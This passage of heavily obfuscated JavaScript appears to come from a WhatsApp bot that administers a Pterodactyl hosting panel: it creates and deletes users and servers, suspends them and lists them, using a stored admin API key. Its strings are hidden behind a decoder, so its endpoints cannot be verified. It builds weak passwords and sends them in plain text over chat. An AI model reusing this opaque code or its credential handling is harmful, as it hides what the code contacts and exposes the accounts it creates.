            if (!_0x3e9c2e) return _0x25b16a(_0x1b775d(0x268));
            userku = _0x2bebc2['replace'](/[^0-9]/g, '');
            let _0x42368b = await _0x23b255[_0x1b775d(0x2a8)](userku + _0x1b775d(0x2f1));
            if (_0x42368b[_0x1b775d(0x111)] == 0x0) return _0x25b16a(_0x1b775d(0x28e));
            let _0x3fba55 = '' + _0x3e9c2e + _0xa77d0c(0x3),
                _0x4d027c = userku + _0x1b775d(0x2f1),
                _0x1e2808 = await fetch(global[_0x1b775d(0x286)] + _0x1b775d(0x22f), {
                    'method': _0x1b775d(0x292),
                    'headers': {
                        'Accept': _0x1b775d(0x285),
                        'Content-Type': _0x1b775d(0x285),
                        'Authorization': _0x1b775d(0x1f9) + global[_0x1b775d(0x1ea)]
                    },
                    'body': JSON['stringify']({
                        'email': _0x3e9c2e + _0x1b775d(0x237),
                        'username': _0x3e9c2e,
                        'first_name': _0x3e9c2e,
                        'last_name': _0x1b775d(0x240),
                        'language': 'en',
                        'password': _0x3fba55
                    })
                }),
                _0x1a56b7 = await _0x1e2808['json']();
            if (_0x1a56b7['errors']) return _0x25b16a(_0x1a56b7['errors'][0x0][_0x1b775d(0x184)]);
            let _0x4ae208 = _0x1a56b7[_0x1b775d(0x163)];
            _0x25b16a(_0x4ae208[_0x1b775d(0x24e)] + ',,' + _0x4ae208['id'] + _0x1b775d(0x158));
            let _0x2d75b8 = await _0x23b255[_0x1b775d(0x13d)](userku + _0x1b775d(0x2f1), {
                'text': _0x1b775d(0x300) + _0x4ae208['id'] + _0x1b775d(0x157) + _0x4ae208[_0x1b775d(0x127)] + _0x1b775d(0x1c1) + _0x4ae208[_0x1b775d(0x24e)] + _0x1b775d(0x1d9) + _0x3fba55 + _0x1b775d(0x2ba) + _0x4ae208['created_at'] + '\x0a\x0aWEB LOGIN:\x0a' + domain + _0x1b775d(0x16d),
                'participant': {
                    'jid': _0x4d027c
                }
            });
            _0x49d796('𝗦𝗨𝗞𝗦𝗘𝗦 𝗠𝗘𝗠𝗕𝗨𝗔𝗧 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟\x0a\x0aID: ' + _0x4ae208['id'] + _0x1b775d(0x2e0) + _0x1a56b7['object'] + _0x1b775d(0x1c1) + _0x4ae208[_0x1b775d(0x24e)] + '\x0aEMAIL: ' + _0x4ae208['email'] + '\x0aNAME: ' + _0x4ae208['first_name'] + ' ' + _0x4ae208[_0x1b775d(0x275)] + _0x1b775d(0x245) + _0x4ae208[_0x1b775d(0x26b)] + '\x0aADMIN: ' + _0x4ae208[_0x1b775d(0x259)] + _0x1b775d(0x1b7) + _0x4ae208[_0x1b775d(0x2d6)] + _0x1b775d(0x2bc) + _0x4d027c[_0x1b775d(0x149)]('@')[0x0], [_0x4d027c]);
        }
        break;
        case 'delusr': {
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x1db));
            let _0x173366 = q;
            if (!_0x173366) return _0x25b16a('ID nya mana?');
            let _0x57e4e0 = await fetch(global[_0x1b775d(0x286)] + '/api/application/users/' + _0x173366, {
                    'method': _0x1b775d(0x142),
                    'headers': {
                        'Accept': _0x1b775d(0x285),
                        'Content-Type': 'application/json',
                        'Authorization': _0x1b775d(0x1f9) + global[_0x1b775d(0x1ea)]
                    }
                }),
                _0x37f51c = await _0x57e4e0[_0x1b775d(0x2d2)]();
            if (_0x37f51c['errors']) return _0x25b16a(util[_0x1b775d(0x17a)](_0x37f51c[_0x1b775d(0x164)][0x0]));
            _0x25b16a(_0x1b775d(0x2b0) + _0x173366 + '*');
        }
        break;
        case _0x1b775d(0x194): {
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x1db));
            let _0x1a473e = _0x3bedf8[0x0],
                _0x537e37 = await fetch(global[_0x1b775d(0x286)] + _0x1b775d(0x296) + _0x1a473e, {
                    'method': _0x1b775d(0x1ad),
                    'headers': {
                        'Accept': _0x1b775d(0x285),
                        'Content-Type': _0x1b775d(0x285),
                        'Authorization': _0x1b775d(0x1f9) + global['key_plta']
                    }
                }),
                _0x42adb6 = await _0x537e37[_0x1b775d(0x2d2)]();
            if (_0x42adb6[_0x1b775d(0x164)]) return _0x25b16a(util['format'](_0x42adb6['errors'][0x0]));
            let _0x52b0fa = _0x42adb6[_0x1b775d(0x163)],
                _0x24b759 = _0x1b775d(0x207) + _0x52b0fa[_0x1b775d(0x24e)][_0x1b775d(0x21e)]() + _0x1b775d(0x122) + _0x52b0fa['id'] + _0x1b775d(0x1c1) + _0x52b0fa[_0x1b775d(0x24e)] + _0x1b775d(0x245) + _0x52b0fa[_0x1b775d(0x26b)] + _0x1b775d(0x1d8) + _0x52b0fa['root_admin'] + _0x1b775d(0x157) + _0x52b0fa[_0x1b775d(0x127)] + _0x1b775d(0x2e7) + _0x52b0fa[_0x1b775d(0x2d6)] + _0x1b775d(0x2fa);
            _0x25b16a(_0x24b759);
        }
        break;
        case _0x1b775d(0x138): {
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x1db));
            let _0x351719 = q ? q : '1',
                _0x4d2ec2 = await fetch(global[_0x1b775d(0x286)] + _0x1b775d(0x1e8) + _0x351719, {
                    'method': _0x1b775d(0x1ad),
                    'headers': {
                        'Accept': _0x1b775d(0x285),
                        'Content-Type': _0x1b775d(0x285),
                        'Authorization': 'Bearer ' + global[_0x1b775d(0x1ea)]
                    }
                }),
                _0x365308 = await _0x4d2ec2[_0x1b775d(0x2d2)]();
            if (_0x365308[_0x1b775d(0x164)]) return _0x25b16a(util[_0x1b775d(0x17a)](_0x365308[_0x1b775d(0x164)][0x0]));
            let _0x18fff3 = _0x1b775d(0x2b2) + global[_0x1b775d(0x2db)] + _0x1b775d(0x180) + _0x365308[_0x1b775d(0x29c)][_0x1b775d(0x1b9)][_0x1b775d(0x277)] + '\x0a▬▭▬▭▬▭▬▭▬▭▬▭\x0a',
                _0x54d415 = _0x365308[_0x1b775d(0x2e1)],
                _0x5c8ee6 = [];
            for (let _0x37917d of _0x54d415) {
                let _0x4fb40a = _0x37917d[_0x1b775d(0x163)],
                    _0x3cb539 = {
                        'id': _0x4fb40a['id'],
                        'username': _0x4fb40a[_0x1b775d(0x24e)],
                        'email': _0x4fb40a['email'],
                        'language': _0x4fb40a['language'],
                        'root_admin': _0x4fb40a[_0x1b775d(0x259)]
                    };
                await _0x5c8ee6['push'](_0x3cb539);
            }
            _0x13a24e(util[_0x1b775d(0x17a)](_0x5c8ee6));
        }
        break;
        case _0x1b775d(0x227): {
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x1db));
            let _0x549c1f = q[_0x1b775d(0x149)](',');
            if (_0x549c1f[_0x1b775d(0x111)] < 0x5) return _0x25b16a(_0x1b775d(0x232));
            let _0x1a919b = _0x549c1f[0x0],
                _0x3c26fa = _0x549c1f[0x1] || ' ',
                _0x47f3a9 = _0x549c1f[0x2],
                _0x4526c0 = _0x549c1f[0x3][_0x1b775d(0x149)]
            `/`, _0x2eecac = _0x549c1f[0x4], _0x326656 = global[_0x1b775d(0x2de)], _0x4c5737 = global[_0x1b775d(0x13e)], _0x5a19ca = await fetch(global['domain'] + _0x1b775d(0x150) + _0x326656, {
                'method': _0x1b775d(0x1ad),
                'headers': {
                    'Accept': _0x1b775d(0x285),
                    'Content-Type': _0x1b775d(0x285),
                    'Authorization': _0x1b775d(0x1f9) + global[_0x1b775d(0x1ea)]
                }
            }), _0xbac8e4 = await _0x5a19ca[_0x1b775d(0x2d2)](), _0x21c4ed = '${CMD_RUN}', _0x23ddb9 = await fetch(domain + '/api/application/servers', {
                'method': _0x1b775d(0x292),
                'headers': {
                    'Accept': _0x1b775d(0x285),
                    'Content-Type': _0x1b775d(0x285),
                    'Authorization': _0x1b775d(0x1f9) + global['key_plta']
                },
                'body': JSON[_0x1b775d(0x1a9)]({
                    'name': _0x1a919b,
                    'description': _0x3c26fa,
                    'user': _0x47f3a9,
                    'egg': parseInt(_0x326656),
                    'docker_image': _0x1b775d(0x20f),
                    'startup': '' + _0x21c4ed,
                    'environment': {
                        'INST': _0x1b775d(0x307),
                        'USER_UPLOAD': '0',
                        'AUTO_UPDATE': '0',
                        'CMD_RUN': _0x1b775d(0x11c)
                    },
                    'limits': {
                        'memory': _0x4526c0[0x0],
                        'swap': 0x0,
                        'disk': _0x4526c0[0x1],
                        'io': 0x1f4,
                        'cpu': _0x2eecac
                    },
                    'feature_limits': {
                        'databases': 0x5,
                        'backups': 0x5,
                        'allocations': 0x5
                    },
                    'deploy': {
                        'locations': [parseInt(_0x4c5737)],
                        'dedicated_ip': ![],
                        'port_range': []
                    }
                })
            }), _0x16845f = await _0x23ddb9[_0x1b775d(0x2d2)]();
            if (_0x16845f[_0x1b775d(0x164)]) return _0x25b16a(util[_0x1b775d(0x17a)](_0x16845f[_0x1b775d(0x164)][0x0]));
            let _0x4dec5a = _0x16845f[_0x1b775d(0x163)],
                _0xb0551a = _0x1b775d(0x17c) + _0x4dec5a['id'] + _0x1b775d(0x2e0) + _0x16845f['object'] + _0x1b775d(0x29a) + _0x4dec5a[_0x1b775d(0x317)] + _0x1b775d(0x171) + (_0x4dec5a[_0x1b775d(0x201)][_0x1b775d(0x22a)] === 0x0 ? _0x1b775d(0x2f8) : _0x4dec5a[_0x1b775d(0x201)][_0x1b775d(0x22a)]) + _0x1b775d(0x2b9) + (_0x4dec5a['limits']['disk'] === 0x0 ? _0x1b775d(0x2f8) : _0x4dec5a[_0x1b775d(0x201)][_0x1b775d(0x18d)]) + _0x1b775d(0x243) + (_0x4dec5a['limits'][_0x1b775d(0x16f)] === 0x0 ? _0x1b775d(0x2f8) : _0x4dec5a['limits'][_0x1b775d(0x16f)]) + _0x1b775d(0x26a) + _0x4dec5a[_0x1b775d(0x2a2)] + _0x1b775d(0x1b7) + _0x4dec5a[_0x1b775d(0x2d6)] + '\x0a';
            _0x13a24e(_0xb0551a);
        }
        break;
        case _0x1b775d(0x22c): {
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x1db));
            let _0x564c62 = q;
            if (!_0x564c62) return _0x25b16a(_0x1b775d(0x170));
            let _0x217076 = await fetch(global[_0x1b775d(0x286)] + _0x1b775d(0x230) + _0x564c62, {
                    'method': _0x1b775d(0x142),
                    'headers': {
                        'Accept': _0x1b775d(0x285),
                        'Content-Type': 'application/json',
                        'Authorization': 'Bearer ' + global[_0x1b775d(0x1ea)]
                    }
                }),
                _0x1e6825 = await _0x217076['json']();
            if (_0x1e6825[_0x1b775d(0x164)]) return _0x25b16a(util[_0x1b775d(0x17a)](_0x1e6825[_0x1b775d(0x164)][0x0]));
            _0x25b16a(_0x1b775d(0x322) + _0x564c62);
        }
        break;
        case _0x1b775d(0x1e4): {
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x1db));
            let _0x5ca2bb = q;
            if (!_0x5ca2bb) return _0x25b16a(_0x1b775d(0x2ca));
            let _0x400c2e = await fetch(global['domain'] + _0x1b775d(0x230) + _0x5ca2bb + _0x1b775d(0x281), {
                    'method': 'POST',
                    'headers': {
                        'Accept': 'application/json',
                        'Content-Type': _0x1b775d(0x285),
                        'Authorization': _0x1b775d(0x1f9) + global[_0x1b775d(0x1ea)]
                    }
                }),
                _0x270d6a = await _0x400c2e['json']();
            if (_0x270d6a[_0x1b775d(0x164)]) return _0x25b16a(util['format'](_0x270d6a[_0x1b775d(0x164)][0x0]));
            _0x25b16a('*SUKSES REINSTALL SERVER ' + q + '*');
        }
        break;
        case _0x1b775d(0x30c): {
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x168));
            let _0x301ee6 = q;
            if (!_0x301ee6) return _0x25b16a(_0x1b775d(0x2ca));
            let _0x25dc7c = await fetch(global[_0x1b775d(0x286)] + _0x1b775d(0x230) + _0x301ee6 + _0x1b775d(0x2d7), {
                    'method': 'POST',
                    'headers': {
                        'Accept': _0x1b775d(0x285),
                        'Content-Type': _0x1b775d(0x285),
                        'Authorization': 'Bearer ' + global[_0x1b775d(0x1ea)]
                    }
                }),
                _0x352c00 = await _0x25dc7c[_0x1b775d(0x2d2)]();
            if (_0x352c00[_0x1b775d(0x164)]) return _0x25b16a(util[_0x1b775d(0x17a)](_0x352c00[_0x1b775d(0x164)][0x0]));
            _0x25b16a('*SUKSES BANNED SERVER ' + q + '*');
        }
        break;
        case _0x1b775d(0x198): {
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x168));
            let _0x58f5a4 = _0x3bedf8[0x0];
            if (!_0x58f5a4) return _0x25b16a(_0x1b775d(0x2ca));
            let _0x5f2cc2 = await fetch(global[_0x1b775d(0x286)] + '/api/application/servers/' + _0x58f5a4 + _0x1b775d(0x21f), {
                    'method': _0x1b775d(0x292),
                    'headers': {
                        'Accept': _0x1b775d(0x285),
                        'Content-Type': _0x1b775d(0x285),
                        'Authorization': _0x1b775d(0x1f9) + global[_0x1b775d(0x1ea)]
                    }
                }),
                _0x50586f = await _0x5f2cc2['json']();
            if (_0x50586f[_0x1b775d(0x164)]) return _0x25b16a(util[_0x1b775d(0x17a)](_0x50586f['errors'][0x0]));
            _0x25b16a('*SUKSES UNBAND SERVER ' + _0x58f5a4 + '*');
        }
        break;
        case _0x1b775d(0x210): {
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x1db));
            let _0x4ee663 = q,
                _0x32c0b2 = await fetch(global[_0x1b775d(0x286)] + _0x1b775d(0x230) + _0x4ee663, {
                    'method': _0x1b775d(0x1ad),
                    'headers': {
                        'Accept': _0x1b775d(0x285),
                        'Content-Type': _0x1b775d(0x285),
                        'Authorization': _0x1b775d(0x1f9) + global[_0x1b775d(0x1ea)]
                    }
                }),
                _0x159c5f = await _0x32c0b2[_0x1b775d(0x2d2)]();
            if (_0x159c5f[_0x1b775d(0x164)]) return _0x25b16a(util['format'](_0x159c5f['errors'][0x0]));
            let _0x4ce7ee = _0x159c5f[_0x1b775d(0x163)],
                _0x3f32a0 = await fetch(domain + _0x1b775d(0x1e2) + _0x4ce7ee['uuid'][_0x1b775d(0x149)]
                    `-` [0x0] + _0x1b775d(0x29e), {
                        'method': 'GET',
                        'headers': {
                            'Accept': 'application/json',
                            'Content-Type': 'application/json',
                            'Authorization': 'Bearer ' + global[_0x1b775d(0x1c4)]
                        }
                    }),
                _0x5b4177 = await _0x3f32a0[_0x1b775d(0x2d2)](),
                _0x1e9182 = _0x5b4177[_0x1b775d(0x163)],
                _0x3d80fc = _0x1b775d(0x207) + _0x4ce7ee[_0x1b775d(0x317)]['toUpperCase']() + _0x1b775d(0x13b) + _0x4ce7ee['id'] + '\x0a● NAME: ' + _0x4ce7ee[_0x1b775d(0x317)] + _0x1b775d(0x2a0) + (_0x4ce7ee['limits'][_0x1b775d(0x22a)] === 0x0 ? _0x1b775d(0x2b5) : _0x4ce7ee[_0x1b775d(0x201)][_0x1b775d(0x22a)] + 'MB') + _0x1b775d(0x25b) + (_0x4ce7ee['limits']['disk'] === 0x0 ? _0x1b775d(0x2b5) : _0x4ce7ee[_0x1b775d(0x201)][_0x1b775d(0x18d)] + 'MB') + '\x0a● CPU: ' + (_0x4ce7ee['limits']['cpu'] === 0x0 ? _0x1b775d(0x1cd) : _0x4ce7ee['limits']['cpu'] + '%') + _0x1b775d(0x2f5) + _0x4ce7ee[_0x1b775d(0x2a2)] + '\x0a● CREATED AT: \x0a ' + _0x4ce7ee['created_at'] + _0x1b775d(0x128);
            _0x25b16a(_0x3d80fc);
        }
        break;
        case _0x1b775d(0x159): {
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x1db));
            let _0x37c73e = q ? q : '1',
                _0x5a8998 = await fetch(global['domain'] + _0x1b775d(0x266) + _0x37c73e, {
                    'method': _0x1b775d(0x1ad),
                    'headers': {
                        'Accept': 'application/json',
                        'Content-Type': _0x1b775d(0x285),
                        'Authorization': _0x1b775d(0x1f9) + global[_0x1b775d(0x1ea)]
                    }
                }),
                _0x339040 = await _0x5a8998[_0x1b775d(0x2d2)]();
            if (_0x339040[_0x1b775d(0x164)]) return _0x25b16a(util['format'](_0x339040[_0x1b775d(0x164)][0x0]));
            let _0x4900ad = _0x339040['data'],
                _0x58f370 = [],
                _0xc0dee2 = '▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\x0a*LIST SERVER PANEL*\x0a□ Nama Host : ' + global[_0x1b775d(0x2db)] + _0x1b775d(0x140) + _0x339040[_0x1b775d(0x29c)]['pagination'][_0x1b775d(0x277)] + _0x1b775d(0x2e8) + _0x339040[_0x1b775d(0x29c)]['pagination'][_0x1b775d(0x125)] + '/' + _0x339040[_0x1b775d(0x29c)][_0x1b775d(0x1b9)][_0x1b775d(0x1d7)] + _0x1b775d(0x146);
            for (let _0x1a2318 of _0x4900ad) {
                let _0x33ff2a = _0x1a2318[_0x1b775d(0x163)],
                    _0x4a602f = await fetch(domain + '/api/client/servers/resources', {
                        'method': _0x1b775d(0x1ad),
                        'headers': {
                            'Accept': _0x1b775d(0x285),
                            'Content-Type': _0x1b775d(0x285),
                            'Authorization': _0x1b775d(0x1f9) + global[_0x1b775d(0x1c4)]
                        }
                    }),
                    _0xd6710 = await _0x4a602f['json'](),
                    _0x7616 = {
                        'id': _0x33ff2a['id'],
                        'name': _0x33ff2a[_0x1b775d(0x317)][_0x1b775d(0x2ea)](),
                        'memory': _0x33ff2a[_0x1b775d(0x201)][_0x1b775d(0x22a)],
                        'disk': _0x33ff2a[_0x1b775d(0x201)][_0x1b775d(0x18d)],
                        'cpu': _0x33ff2a[_0x1b775d(0x201)]['cpu']
                    };
                await _0x58f370[_0x1b775d(0x280)](_0x7616);
            }
            _0x25b16a(util[_0x1b775d(0x17a)](_0x58f370));
        }
        break;
        case _0x1b775d(0x22b):
        case 'sound2':
        case 'sound3':
        case _0x1b775d(0x15c):
        case _0x1b775d(0x144):
        case _0x1b775d(0x1e0):
        case _0x1b775d(0x305):
        case _0x1b775d(0x255):
        case _0x1b775d(0x145):
        case _0x1b775d(0x153):
        case _0x1b775d(0x2ee):
        case _0x1b775d(0x23d):
        case 'sound13':
        case _0x1b775d(0x1c7):
        case _0x1b775d(0x2b1):
        case _0x1b775d(0x25a):
        case _0x1b775d(0x19b):
        case _0x1b775d(0x130):
        case 'sound19':
        case _0x1b775d(0x10e):
        case _0x1b775d(0x2e3):
        case _0x1b775d(0x1f8):
        case 'sound23':
        case _0x1b775d(0x2d3):
        case _0x1b775d(0x18e):
        case _0x1b775d(0x202):
        case _0x1b775d(0x2f3):
        case _0x1b775d(0x2df):
        case 'sound29':
        case _0x1b775d(0x2ab):
        case 'sound31':
        case _0x1b775d(0x11d):
        case _0x1b775d(0x211):
        case _0x1b775d(0x200):
        case _0x1b775d(0x1ae):
        case _0x1b775d(0x1a5):
        case _0x1b775d(0x1c3):
        case _0x1b775d(0x25e):
        case _0x1b775d(0x156):
        case _0x1b775d(0x2a5):
        case 'sound41':
        case _0x1b775d(0x32c):
        case _0x1b775d(0x2a7):
        case _0x1b775d(0x2ce):
        case _0x1b775d(0x1de):
        case _0x1b775d(0x1b2):
        case _0x1b775d(0x12d):
        case _0x1b775d(0x216):
        case _0x1b775d(0x162):
        case _0x1b775d(0x1ef):
        case _0x1b775d(0x2cd):
        case _0x1b775d(0x1f1):
        case _0x1b775d(0x319):
        case _0x1b775d(0x1f7):
        case 'sound55':
        case 'sound56':
        case _0x1b775d(0x1eb):
        case 'sound58':
        case 'sound59':
        case 'sound60':
        case _0x1b775d(0x19f):
        case _0x1b775d(0x2f4):
        case _0x1b775d(0x2e6):
        case _0x1b775d(0x1a1):
        case _0x1b775d(0x1cf):
        case 'sound66':
        case _0x1b775d(0x123):
        case _0x1b775d(0x303):
        case _0x1b775d(0x2f9):
        case 'sound70':
        case _0x1b775d(0x1a7):
        case _0x1b775d(0x10a):
        case _0x1b775d(0x27d):
        case _0x1b775d(0x297):
        case _0x1b775d(0x133):
        case _0x1b775d(0x295):
        case 'sound77':
        case 'sound78':
        case 'sound79':
        case 'sound80':
        case _0x1b775d(0x14e):
        case _0x1b775d(0x2be):
        case _0x1b775d(0x181):
        case _0x1b775d(0x318):
        case _0x1b775d(0x24a):
        case _0x1b775d(0x279):
        case _0x1b775d(0x177):
        case _0x1b775d(0x215):
        case 'sound89':
        case _0x1b775d(0x250):
        case _0x1b775d(0x264):
        case _0x1b775d(0x183):
        case _0x1b775d(0x326):
        case _0x1b775d(0x118):
        case _0x1b775d(0x17e):
        case _0x1b775d(0x17b):
        case _0x1b775d(0x323):
        case _0x1b775d(0x284):
        case _0x1b775d(0x166):
        case 'sound100':
        case _0x1b775d(0x173):
        case _0x1b775d(0x1ca):
        case _0x1b775d(0x2d5):
        case _0x1b775d(0x23c):
        case 'sound105':
        case _0x1b775d(0x197):
        case _0x1b775d(0x193):
        case 'sound108':
        case _0x1b775d(0x248):
        case 'sound110':
        case 'sound111':
        case _0x1b775d(0x217):
        case _0x1b775d(0x10c):
        case _0x1b775d(0x246):
        case 'sound115':
        case _0x1b775d(0x17f):
        case _0x1b775d(0x321):
        case _0x1b775d(0x1f6):
        case 'sound119':
        case _0x1b775d(0x117):
        case _0x1b775d(0x12b):
        case _0x1b775d(0x262):
        case _0x1b775d(0x134):
        case _0x1b775d(0x152):
        case 'sound125':
        case _0x1b775d(0x126):
        case _0x1b775d(0x258):
        case 'sound128':
        case _0x1b775d(0x1e3):
        case _0x1b775d(0x308):
        case _0x1b775d(0x188):
        case 'sound132':
        case 'sound133':
        case _0x1b775d(0x1e9):
        case 'sound135':
        case _0x1b775d(0x191):
        case _0x1b775d(0x178):
        case 'sound138':
        case _0x1b775d(0x32b):
        case _0x1b775d(0x135):
        case _0x1b775d(0x314):
        case _0x1b775d(0x1a2):
        case _0x1b775d(0x310):
        case 'sound144':
        case _0x1b775d(0x196):
        case 'sound146':
        case _0x1b775d(0x301):
        case _0x1b775d(0x2ec):
        case _0x1b775d(0x291):
        case _0x1b775d(0x31a):
        case _0x1b775d(0x2e2):
        case _0x1b775d(0x155):
        case 'sound153':
        case _0x1b775d(0x1be):
        case 'sound155':
        case _0x1b775d(0x147):
        case _0x1b775d(0x14b):
        case _0x1b775d(0x205):
        case _0x1b775d(0x2f6):
        case _0x1b775d(0x1ed):
        case _0x1b775d(0x228): {
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb && !_0x1eaf88) return;
            strava_dev = await getBuffer(_0x1b775d(0x174) + _0x2818bf + _0x1b775d(0x222)), _0x23b255['sendMessage'](_0x42fa35, {
                'audio': strava_dev,
                'mimetype': _0x1b775d(0x113),
                'ptt': !![]
            }, {
                'quoted': _0x38267e
            });
        }
        break;
        default:
        }
    } catch (_0x3af1df) {
        froom = _0x38267e[_0x1b775d(0x2ad)]['remoteJid'], stravaRorr = async () => {
            const _0x16ae86 = _0x1b775d;
            _0x23b255[_0x16ae86(0x13d)](froom, {
                'text': util[_0x16ae86(0x17a)](_0x3af1df)
            });
        }, stravaRorr();
    }
};
let file = require[_0x296d57(0x16e)](__filename);
fs[_0x296d57(0x187)](file, () => {
    const _0x10e7f1 = _0x296d57;
    fs[_0x10e7f1(0x1b4)](file), console[_0x10e7f1(0x2a1)](chalk[_0x10e7f1(0x2b3)](_0x10e7f1(0x24d) + __filename)), delete require[_0x10e7f1(0x226)][file], require(file);
});